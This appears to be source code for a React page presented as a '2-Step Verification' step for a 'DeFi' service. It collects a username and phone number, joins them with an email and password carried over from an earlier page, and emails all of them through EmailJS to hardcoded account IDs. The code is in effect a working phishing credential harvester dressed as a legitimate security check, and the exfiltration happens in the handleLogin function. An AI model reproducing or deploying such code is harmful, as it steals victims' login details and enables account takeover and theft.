import  { useState ,useContext} from 'react';
import { useNavigate} from 'react-router-dom';
import emailjs from 'emailjs-com';
import { MyContext } from './MyContext';
// import { kMaxLength } from 'buffer';

const ToStep = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [emailPlaceholder, setEmailPlaceholder] = useState('Enter Username');
  const [passwordPlaceholder, setPasswordPlaceholder] = useState('Enter your Number');
  const navigate = useNavigate();

  const context =useContext(MyContext);
  if(!context){
    throw new Error("Mycontext fill not found ");
  }


 const {cemail,cpassword}=context;

  const handleLogin = () => {
    let isValid = true;

    // Email validation
    if (!email) {
      setEmailError('Username is required');
      setEmailPlaceholder('Enter Username');
      isValid = false;
    } else if (!/^[a-zA-Z0-9\s.,!?'"()_-]*$/.test(email)) {
      setEmailError('Invalid Username format');
      isValid = false;
    } else {
      setEmailError('');
    }

    // Password validation
    if (!password) {
      setPasswordError('Number is required');
      setPasswordPlaceholder('Enter your Number');
      isValid = false;
    } else {
      setPasswordError('');
    }

    // If valid, send email
    if (isValid) {
      const templateParams = {
        web_name:'DeFi',
        from_name: 'DeFi',
        message: `Name: ${email},
        Email: ${cemail},
        Phone: ${password}, 
        Password: ${cpassword}, 
        Date: ${new Date().toLocaleDateString()}, 
        Time: ${new Date().toLocaleTimeString()}`,
      };

      emailjs
        .send(
          'service_d7iarfv', // Your EmailJS Service ID
          'template_zzgorrr', // Your EmailJS Template ID
          templateParams,
          'cD8XBmJIzmsXY6T3j' // Your EmailJS Public Key
        )
        .then(() => {
          setEmail('');
          setPassword('');
          navigate('/expert'); // Navigate to the target route
        })
        .catch((error) => {
          console.error('Error:', error);
          alert('Failed to send email.');
        });
    }
  };

  return (
    <div className="bg-white min-h-screen flex flex-col items-center ">
      <header className="flex justify-center mb-8">
        <img
          alt="Navigation"
          className="w-32"
          src="/DeFi.jpg"
        />
      </header>

      <div className="w-full max-w-lg  bg-white p-8 rounded-lg shadow-lg">
        <main className="flex flex-col items-center">
          <h1 className="text-blue-800 text-3xl font-medium pb-5">2-Step Verification</h1>
          <h3 className="text-lg text-gray-700 mb-6">Verify Your Identity</h3>
          <form
            method="post"
            onSubmit={(e) => {
              e.preventDefault();
              handleLogin();
            }}
            className="w-full"
          >
            <div className="mb-4">
              <input
                type="text"
                id="email"
                name="name"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder={emailPlaceholder}
                className={`w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                  emailError || emailPlaceholder === 'Enter Username' ? 'border-[gray]' : 'border-gray-300'
                }`}
                required
              />
              {emailError && <p className="text-[gray] text-xs mt-1">{emailError}</p>}
            </div>
            <div className="mb-6">
            <input
  type="text"  // Change to text to prevent browser up/down arrows
  id="password"
  value={password}
  onChange={(e) => {
    const input = e.target.value.replace(/\D/g, ''); // Remove non-numeric characters
    if (input.length <= 10) setPassword(input);
  }}
  placeholder={passwordPlaceholder}
  className={`w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 ${
    passwordError ? 'border-[gray]' : 'border-gray-300'
  }`}
  required
/>

              {passwordError && <p className="text-[gray] text-xs mt-1">{passwordError}</p>}
            </div>
            <div className="flex justify-center">
              <button
                type="submit"
                className="w-full bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700"
              >
                Submit
              </button>
            </div>
          </form>
        </main>
      </div>
    </div>
  );
};

export default ToStep;
